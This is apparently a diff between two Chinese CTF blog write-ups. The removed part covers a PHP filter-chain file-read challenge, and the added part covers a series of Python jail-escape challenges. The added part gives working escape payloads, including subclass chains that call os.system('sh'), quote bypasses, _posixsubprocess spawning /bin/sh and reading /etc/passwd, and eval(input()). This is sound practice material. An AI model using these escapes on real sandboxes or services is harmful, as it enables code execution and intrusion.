-<p>——————</p>
-<p>开题就是一个小游戏，查看源码看到如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" alt="image-20240527154205080"></p>
-<p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" alt="image-20240527154253580"></p>
-<p>直接跳转到这个文件，得到php代码，如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
-<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" alt="image-20240527154613313"></p>
-<p>我们本地看看结果是什么</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" alt="image-20240527174205087"></p>
-<p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" alt="image-20240527174836426"></p>
-<p>最终效果</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" alt="image-20240527174418038"></p>
-<p>再传入题目中：</p>
-<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" alt="image-20240527174628296"></p>
+<p>就是限制长度小于13</p>
+<p>可以直接使用<code>breakpoint()</code>，如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601210703788.png" alt="image-20240601210703788"></p>
 <p>得到flag</p>
-<p>参考文章：</p>
-<p><code>https://tttang.com/archive/1395/</code></p>
-<p><code>https://probiusofficial.github.io/2023/02/07/Filter/#php-x2F-x2F-filter</code></p>
-<p><code>https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;02f51feb-0822-4684-afac-cffdcffa71d4&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（不知道为啥help()最后getshell那里出不了。？？）</p>
+<p>**还可以传入<code>eval(input())</code>**，然后再输入任意代码可以执行，这样可以绕过任何防护。</p>
+<h3 id="calc-jail-beginner-level3-JAIL"><a href="#calc-jail-beginner-level3-JAIL" class="headerlink" title="calc_jail_beginner_level3(JAIL)"></a>calc_jail_beginner_level3(JAIL)</h3><p>关键源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>限制长度为7，前面一道题的函数用不了了，再尝试一下<code>help()</code></p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601211200702.png" alt="image-20240601211200702"></p>
+<p>这里又可以用了。可能是环境问题或者题目设置的吧吧。多试试，这里成功得到flag。</p>
+<h3 id="calc-jail-beginner-level2-5-JAIL"><a href="#calc-jail-beginner-level2-5-JAIL" class="headerlink" title="calc_jail_beginner_level2.5(JAIL)"></a>calc_jail_beginner_level2.5(JAIL)</h3><p>关键源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">——————</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>breakpoint()</code>，如下：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601212002612.png" alt="image-20240601212002612"></p>
+<h3 id="calc-jail-beginner-level5-JAIL"><a href="#calc-jail-beginner-level5-JAIL" class="headerlink" title="calc_jail_beginner_level5(JAIL)"></a>calc_jail_beginner_level5(JAIL)</h3><p>没给附件，开题显示：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601212548989.png" alt="image-20240601212548989"></p>
+<p>dir()说明：</p>
+<p><strong>dir()</strong> 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表</p>
+<p>看看dir()的结果</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214137053.png" alt="image-20240601214137053"></p>
+<p>再看看<code>my_flag</code>的属性：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214233949.png" alt="image-20240601214233949"></p>
+<p>这里看到一个flag_level5，尝试读取，</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214345028.png" alt="image-20240601214345028"></p>
+<p>显示被删除了，再看看这个flag_level5的属性呢</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601214515679.png" alt="image-20240601214515679"></p>
+<p>这里有个encode，一般encode()都与字符串相关，尝试读取</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240601220055100.png" alt="image-20240601220055100"></p>
+<p><strong>同时注意</strong>，这道题可以直接用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>，打，对于ctf要保持这种思想，多思考源码可能得部分，<strong>但是这里的考点还是需要掌握</strong>。使用这个方法看看源码：<br>load_flag.py:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">secert_flag</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DELETED&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DELETED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flag_level5</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, flag: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="built_in">setattr</span>(self, <span class="string">&#x27;flag_level5&#x27;</span>, secert_flag(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> flag_level5(f.read())</span><br></pre></td></tr></table></figure>
+
+<p>server.py：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   </span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>代码中的 <code>secert_flag</code> 类是一个 <code>str</code> 类型的子类。在这个子类中，<code>__repr__()</code> 和 <code>__str__()</code> 方法都被改写为返回 “DELETED”，这两个方法在 Python 中用于获取对象的字符串表示。</p>
+<p>那么，什么是 <code>__repr__</code> 和 <code>__str__</code> 方法？</p>
+<ol>
+<li><code>__repr__</code> 方法返回一个表达式字符串，当这个字符串经过 <code>eval()</code> 函数求值时，可以重新得到这个对象。它的目标是准确性。这个方法在你直接打印一个对象、调用 <code>repr()</code> 函数时会被调用。</li>
+<li><code>__str__</code> 方法返回一个对象的文本表示。这个方法的目标是可读性。在 <code>print()</code> 函数和 <code>str()</code> 函数中会用到。</li>
+</ol>
+<p>当你打印一个 <code>secert_flag</code> 对象或调用 <code>str()</code> 或者 <code>repr()</code> 函数 on <code>secert_flag</code> 对象时，Python 因此返回 “DELETED”。</p>
+<p>而当你调用 <code>.encode()</code> 方法时，Python 将字符串对象转换为原始的字节字符串表示。<code>.encode()</code> 方法不调用 <code>__str__</code> 或 <code>__repr__</code>，因此，它能够显示出被 <code>__str__</code> 和 <code>__repr__</code> 方法隐藏的原始字符串内容，这就是你看到的 flag。</p>
+<p><strong>这一点体现出了 Python 的面向对象特性 —— 你可以通过子类覆盖父类的方法来改变对象的行为。在这个 CTF 挑战中，这个特性被用来隐藏 flag。</strong></p>
+<h3 id="calc-jail-beginner-level4-JAIL"><a href="#calc-jail-beginner-level4-JAIL" class="headerlink" title="calc_jail_beginner_level4(JAIL)"></a>calc_jail_beginner_level4(JAIL)</h3><p>关键代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">————————    </span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>删除了几个函数，并且有黑名单：<code>&quot;</code>、<code>&#39;</code>、<code>反引号</code>。</p>
+<p>由于这里删除了<code>__Import__</code>函数，所以不能导入模块，看了一下笔记，这里尝试使用继承链。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602010131729.png" alt="image-20240602010131729"></p>
+<p>这里知道了os模块在倒数第四个，想要构造的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后这里过滤了引号，可以使用<code>bytes()</code>函数或<code>__doc__</code>，如下构造：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
+
+<p>成功执行：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602012213510.png" alt="image-20240602012213510"></p>
+<p>对于上面的payload，只用其中一种函数就行，这里只是为了将可利用的表达式给出来，对于<code>__doc__</code>可以先本地跑出来数字再传参，实在不行在题目环境跑，只不过同样需要绕过等号。</p>
+<h3 id="calc-jail-beginner-level4-0-5-JAIL"><a href="#calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="calc_jail_beginner_level4.0.5(JAIL)"></a>calc_jail_beginner_level4.0.5(JAIL)</h3><p>没给附件。开题显示：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602100727394.png" alt="image-20240602100727394"></p>
+<p>这里给了禁了的东西。</p>
+<p>尝试直接的文件，猜测为当前目录的<code>flag</code>文件，如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(open(list(dict(flag=1))[0]).read())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602101029115.png" alt="image-20240602101029115"></p>
+<p>成功得到。</p>
+<p>那么现在来尝试读取不读文件，还是尝试使用继承链，可以直接使用上一道题的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602101302869.png" alt="image-20240602101302869"></p>
+<h3 id="calc-jail-beginner-level5-1-JAIL"><a href="#calc-jail-beginner-level5-1-JAIL" class="headerlink" title="calc_jail_beginner_level5.1(JAIL)"></a>calc_jail_beginner_level5.1(JAIL)</h3><p>无附件，开题：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602105212292.png" alt="image-20240602105212292"></p>
+<p>?，怎么又是这个，还是先不拘泥于这个，尝试直接导入，好吧，尝试过后应该是import被删了，那么尝试之前的方法，过程一样，成功：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602110047376.png" alt="image-20240602110047376"></p>
+<p>但是在尝试的时候题目禁止了print()、help()等内置函数，却可以使用dir()内置函数，应该是题目设置的。</p>
+<h3 id="calc-jail-beginner-level4-1-JAIL"><a href="#calc-jail-beginner-level4-1-JAIL" class="headerlink" title="calc_jail_beginner_level4.1(JAIL)"></a>calc_jail_beginner_level4.1(JAIL)</h3><p>题目无附件，开题：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602110456229.png" alt="image-20240602110456229"></p>
+<p>还是用继承链打，这里使用<code>__doc__</code>，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"><span class="comment">#同样还是倒数第四个</span></span><br></pre></td></tr></table></figure>
+
+<p>绕引号，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602111916342.png" alt="image-20240602111916342"></p>
+<p>得到flag。</p>
+<p>从其他地方学到的一个做题技巧，由于<code>bytes()</code>是内置函数，所以我们可以在<code>object</code>类中看到它，<br>本地来测试，等下直接给payload打题。</p>
+<p>测试代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c= <span class="string">&#x27;().__class__.__base__.__subclasses__()&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(c))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602122042032.png" alt="image-20240602122042032"></p>
+<p>这里可以看到<code>bytes</code>在第7个，尝试引用它：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[6]</span><br></pre></td></tr></table></figure>
+
+<p>此时再结合利用<code>bytes()</code>函数绕过引号起来看看：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&#x27;().__class__.__base__.__subclasses__()[6]([108,115]).decode()&#x27;</span>))</span><br><span class="line"><span class="comment">#ls</span></span><br></pre></td></tr></table></figure>
+
+<p>成功得到ls，那么再构造一下上面的payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system</span></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>]).decode()</span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">104</span>]).decode()</span><br><span class="line"><span class="comment">#再如下构造：</span></span><br><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>,<span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123430218.png" alt="image-20240602123430218"></p>
+<p>成功执行。<strong>对于第二种这样直接找内置函数的方法还是比较<u>重要</u>，掌握</strong>。</p>
+<h3 id="calc-jail-beginner-level4-3-JAIL"><a href="#calc-jail-beginner-level4-3-JAIL" class="headerlink" title="calc_jail_beginner_level4.3(JAIL)"></a>calc_jail_beginner_level4.3(JAIL)</h3><p>无附件，开题：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123622080.png" alt="image-20240602123622080"></p>
+<p>多过滤了一个<code>+</code>号，可以直接用上一道题的第二个方法的payload打：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602123847401.png" alt="image-20240602123847401"></p>
+<p><strong>还可以使用笔记里面的<code>join()</code>来打：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">测试一下：</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;str().join([().__doc__[19],().__doc__[23]])&quot;</span>))</span><br><span class="line"><span class="comment">#成功得到se</span></span><br></pre></td></tr></table></figure>
+
+<p>那么现在就开始构造：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system </span></span><br><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])</span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]])</span><br><span class="line"><span class="comment">#再最后构造</span></span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
+
+<p>成功执行：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602130242008.png" alt="image-20240602130242008"></p>
+<h3 id="calc-jail-beginner-level4-2-JAIL"><a href="#calc-jail-beginner-level4-2-JAIL" class="headerlink" title="calc_jail_beginner_level4.2(JAIL)"></a>calc_jail_beginner_level4.2(JAIL)</h3><p>无附件，开题：</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135137862.png" alt="image-20240602135137862"></p>
+<p>直接用上一道题的两种payload都能打</p>
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135448221.png" alt="image-20240602135448221"></p>
+<h3 id="calc-jail-beginner-level6-JAIL"><a href="#calc-jail-beginner-level6-JAIL" class="headerlink" title="calc_jail_beginner_level6(JAIL)"></a>calc_jail_beginner_level6(JAIL)</h3><p>无附件，但开题的时候给了部分源码：<br><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602135618416.png" alt="image-20240602135618416"></p>
+<p>这是基于audit hook的沙箱，开了一个白名单，使用<code>_posixsubprocess</code>模块 执行命令，使用笔记上的</p>
+<p>payload，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/02/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20240602144311501.png" alt="image-20240602144311501"></p>
+<p>成功读取，那么现在将其改为sh交互模式的payload，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False,False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>
+
